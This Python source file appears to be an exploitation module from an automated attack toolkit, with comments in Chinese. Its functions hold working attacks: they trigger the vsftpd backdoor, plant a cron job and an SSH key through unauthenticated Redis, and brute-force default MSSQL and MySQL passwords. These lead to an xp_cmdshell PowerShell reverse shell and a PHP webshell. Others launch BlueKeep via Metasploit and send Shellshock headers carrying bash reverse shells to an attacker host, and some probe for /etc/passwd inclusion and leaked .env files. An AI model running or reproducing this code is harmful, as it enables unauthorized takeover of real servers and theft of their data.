import socket
import time
import threading
import subprocess
import tempfile
import os,sys
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
lib_path = os.path.join(project_root, "lib")
sys.path.insert(0, lib_path)
import hashlib
from colorama import Fore,init
init(autoreset=True)
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "Port Spoofing & Service Trigger Exploits"
        self.port = None
        self.protocol = "tcp"
        self.platform = "multi"
        self.use_msf = False

        self.triggers = {
            21:   self.ftp_triggers,
            22:   self.ssh_triggers,
            23:   self.telnet_triggers,
            6200: self.vsftpd_backdoor_connect,
            6379: self.redis_unauth,
            445:  self.samba_usermap,
            139:  self.samba_usermap,
            1433: self.mssql_trigger,
            3306: self.mysql_trigger,
            3389: self.rdp_trigger,
            8080: self.http_trigger,
            80:   self.http_trigger,
            443:  self.http_trigger,
        }

    def exploit(self, target_ip=None, target_port=None, lhost=None, session=None):
        if target_port is not None:
            ports_to_try = [target_port]
        else:
            ports_to_try = list(self.triggers.keys())

        for port in ports_to_try:
            safe_print(f"{Fore.GREEN}[*] 尝试对端口 {port} 进行欺骗攻击...")
            try:
                fn = self.triggers.get(port)
                if fn is None:
                    continue
                success, result = fn(target_ip, port, lhost)
            except Exception as e:
                safe_print(f"{Fore.RED}[-] 端口 {port} 触发异常: {e!r}")
                continue
            if success:
                return True, result
        return False, f"{Fore.RED}所有端口欺骗攻击均未成功"

    def ftp_triggers(self, target_ip, port, lhost):
        # 尝试 vsftpd 2.3.4 笑脸后门
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, port))
            banner = sock.recv(1024).decode(errors='ignore')
            sock.send(b'USER backdoored:)\r\n')
            sock.send(b'PASS pass\r\n')
            time.sleep(1)
            sock.close()
            # 检查6200端口
            backdoor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backdoor_sock.settimeout(3)
            result = backdoor_sock.connect_ex((target_ip, 6200))
            if result == 0:
                backdoor_sock.send(b'id\n')
                resp = backdoor_sock.recv(1024).decode()
                if 'uid=' in resp:
                    return True, "vsftpd 2.3.4 后门触发成功，已获得shell"
            backdoor_sock.close()
        except:
            pass

        # 尝试 ProFTPD 1.3.3c HELP ACIDBITCHEZ 溢出（简化，可通过MSF完成）
        # 此处仅探测版本并返回建议
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, port))
            sock.send(b'HELP ACIDBITCHEZ\r\n')
            resp = sock.recv(1024).decode()
            if '502' not in resp:
                return False, "ProFTPD可能不存在ACIDBITCHEZ漏洞"
            sock.close()
        except:
            pass

        return False, "FTP欺骗未成功"

    def vsftpd_backdoor_connect(self, target_ip, port, lhost):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, port))
            sock.send(b'id\n')
            resp = sock.recv(1024).decode()
            if 'uid=' in resp:
                return True, "后门端口直接返回shell"
            sock.close()
        except:
            pass
        return False, "连接后门端口失败"

    def redis_unauth(self, target_ip, port, lhost):
        try:
            import redis
            r = redis.Redis(host=target_ip, port=port, socket_timeout=5)
            r.ping()
            # 写SSH公钥（若存在/root/.ssh目录）
            pubkey = self._generate_ssh_pubkey()
            r.set('sshkey', f'\n{pubkey}\n')
            r.config_set('dir', '/root/.ssh')
            r.config_set('dbfilename', 'authorized_keys')
            r.save()
            # 或者写计划任务（使用 .format() 避免 f-string 解析错误）
            cron_payload = "\n* * * * * root bash -c 'bash -i >& /dev/tcp/{}/4444 0>&1'\n".format(lhost)
            r.set('cron', cron_payload)
            r.config_set('dir', '/etc/cron.d')
            r.config_set('dbfilename', 'redis_root')
            r.save()
            return True, f"Redis未授权访问，已尝试写入SSH公钥和计划任务，请监听 {lhost}:4444"
        except ImportError:
            # 无redis库，用socket模拟简单检测
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, port))
                sock.send(b'PING\r\n')
                if b'PONG' in sock.recv(1024):
                    return False, "Redis未授权但无redis-py库，无法自动利用，建议手动"
            except:
                pass
            return False, "Redis利用失败"
        except Exception as e:
            return False, f"Redis利用错误: {e}"

    def samba_usermap(self, target_ip, port, lhost):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        if s.connect_ex((target_ip, port)) != 0:
            s.close()
            return False, "SMB端口未开放"
        s.close()
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(target_ip, target_ip, timeout=3)
            # 实际利用复杂，这里实在写不了了
            return False, "Samba usermap建议使用MSF模块（已在MSF库中）"
        except ImportError:
            return False, "缺少impacket库，建议使用MSF模块"

    def mssql_trigger(self, target_ip, port, lhost):
        """尝试MSSQL弱口令 + xp_cmdshell开启"""
        credentials = [('sa', ''), ('sa', 'sa'), ('sa', 'password'), ('sa', 'admin')]
        try:
            import pymssql
        except ImportError:
            return False, "缺少pymssql库，无法自动利用MSSQL"
    
        for user, pwd in credentials:
            try:
                conn = pymssql.connect(server=target_ip, port=port, user=user, password=pwd, login_timeout=5)
                cursor = conn.cursor()
                cursor.execute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
                cursor.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
                # PowerShell反弹命令，用.format()替换并转义花括号
                ps_cmd = (
                    "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',4444);"
                    "$stream = $client.GetStream();"
                    "[byte[]]$bytes = 0..65535|%{{0}};"
                    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
                    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                    "$sendback = (iex $data 2>&1 | Out-String );"
                    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                    "$stream.Write($sendbyte,0,$sendbyte.Length);"
                    "$stream.Flush()}};"
                    "$client.Close()"
                ).format(lhost=lhost)
                cmd = f"xp_cmdshell 'powershell -c \"{ps_cmd}\"'"
                cursor.execute(cmd)
                conn.close()
                return True, f"MSSQL xp_cmdshell已启用，反弹shell至 {lhost}:4444"
            except Exception as e:
                continue
        return False, "MSSQL弱口令爆破失败或无法启用xp_cmdshell"

    def mysql_trigger(self, target_ip, port, lhost):
        """MySQL UDF提权或写webshell"""
        try:
            import pymysql
            # 尝试弱口令
            creds = [('root', ''), ('root', 'root'), ('root', 'password'),
                ("kali", "kali"), ("HFish", "HFish2021")
            ]
            for user, pwd in creds:
                try:
                    conn = pymysql.connect(host=target_ip, port=port, user=user, password=pwd, connect_timeout=5)
                    cursor = conn.cursor()
                    # 检查是否有写权限
                    cursor.execute("SELECT @@secure_file_priv;")
                    secure = cursor.fetchone()[0]
                    if secure == '' or secure is None:
                        # 写UDF DLL或者写计划任务（Linux）
                        # 简化：写webshell到/var/www/html/如果存在
                        webshell = "<?php system($_GET['cmd']); ?>"
                        cursor.execute(f"SELECT '{webshell}' INTO OUTFILE '/var/www/html/shell.php'")
                        conn.close()
                        return True, "MySQL写webshell至 /var/www/html/shell.php，请访问 http://target/shell.php?cmd=id"
                    else:
                        return False, f"MySQL secure_file_priv限制为 {secure}"
                except Exception as e:
                    continue
            return False, "MySQL弱口令爆破失败或写文件受限"
        except ImportError:
            return False, "缺少pymysql库，无法自动利用MySQL"
        except Exception as e:
            return False, f"MySQL利用错误: {e}"

    def rdp_trigger(self, target_ip, port, lhost):
        if not getattr(self, 'msf_client', None):
            return False, "需要MSF客户端支持BlueKeep"
        try:
            exploit = self.msf_client.modules.use(
                'exploit', 'windows/rdp/cve_2019_0708_bluekeep_rce'
            )
            exploit['RHOSTS'] = target_ip
            exploit['RPORT'] = port
            result = exploit.execute(
                payload="windows/x64/meterpreter/reverse_tcp",
                options={"LHOST": lhost, "LPORT": 4444},
            )
            if result and result.get("job_id"):
                return True, f"BlueKeep 已提交 (job {result['job_id']})，监听 {lhost}:4444"
            return False, f"BlueKeep 提交失败: {result}"
        except Exception as e:
            return False, f"BlueKeep 利用失败: {e!r}"

    def http_trigger(self, target_ip, port, lhost):
        """常见Web漏洞：Shellshock、文件包含、备份文件等"""
        import requests
        base_url = f"http://{target_ip}:{port}" if port != 443 else f"https://{target_ip}:{port}"
        # 1. Shellshock 测试
        import uuid
        marker = "SHELLSHOCK_" + uuid.uuid4().hex[:12]
        sh_headers = {
            "User-Agent":        f"() {{ :; }}; echo; echo {marker}",
            "Referer":           f"() {{ :; }}; echo; echo {marker}",
            "X-Test-Shellshock": f"() {{ :; }}; echo; echo {marker}",
        }
        cgi_paths = ("/cgi-bin/test.cgi", "/cgi-bin/status",
                     "/cgi-bin/admin", "/cgi-bin/ping")
        shellshock_confirmed = False
        for cgi in cgi_paths:
            try:
                r = requests.get(base_url + cgi, headers=sh_headers,
                                 timeout=3, verify=False)
                if marker in r.text:
                    shellshock_confirmed = True
                    break
            except Exception:
                pass

        if shellshock_confirmed:
            # 确认漏洞后，再发一次反弹 shell（成功与否需监听端确认）
            rev_headers = {
                "User-Agent": f"() {{ :; }}; /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/4444 0>&1'",
            }
            for cgi in cgi_paths:
                try:
                    requests.get(base_url + cgi, headers=rev_headers,
                                 timeout=2, verify=False)
                except Exception:
                    pass
            return True, (
                f"Shellshock 命令执行成功"
                f"已尝试反弹至 {lhost}:4444"
            )

        # 2. 常见备份文件泄露
        backups = ['/backup.zip', '/www.zip', '/web.zip', '/backup.tar.gz', '/.git/config', '/.env']
        for path in backups:
            try:
                r = requests.get(base_url + path, timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 100:
                    return True, f"发现敏感文件: {path}，可能包含源码或配置"
            except:
                pass

        # 3. PHPInfo 信息泄露
        try:
            r = requests.get(base_url + "/phpinfo.php", timeout=5)
            if 'PHP Version' in r.text:
                return True, "发现phpinfo.php，可获取系统信息"
        except:
            pass

        # 4. 尝试文件包含（若存在参数）
        params = ['file', 'page', 'path', 'include']
        for p in params:
            try:
                r = requests.get(base_url, params={p: '/etc/passwd'}, timeout=5)
                if 'root:' in r.text:
                    return True, "存在文件包含漏洞，可读取/etc/passwd"
            except:
                pass

        return False, "HTTP常见漏洞探测未发现明显弱点，可进一步扫描"

    def ssh_triggers(self, target_ip, port, lhost):
        # 由分布式爆破模块处理
        return False, "SSH交由分布式爆破模块"

    def telnet_triggers(self, target_ip, port, lhost):
        # 可添加弱口令尝试
        return False, "Telnet交由分布式爆破模块"

    def _generate_ssh_pubkey(self):
        """生成临时SSH密钥对并返回公钥内容"""
        key_dir = tempfile.mkdtemp()
        key_path = os.path.join(key_dir, "id_rsa")
        subprocess.run(f"ssh-keygen -t rsa -b 2048 -f {key_path} -N '' -q", shell=True)
        with open(key_path + ".pub", "r") as f:
            pubkey = f.read().strip()
        # 保存私钥到当前目录供后续连接使用
        with open("redis_privkey", "w") as f:
            with open(key_path, "r") as priv:
                f.write(priv.read())
        os.chmod("redis_privkey", 0o600)
        return pubkey
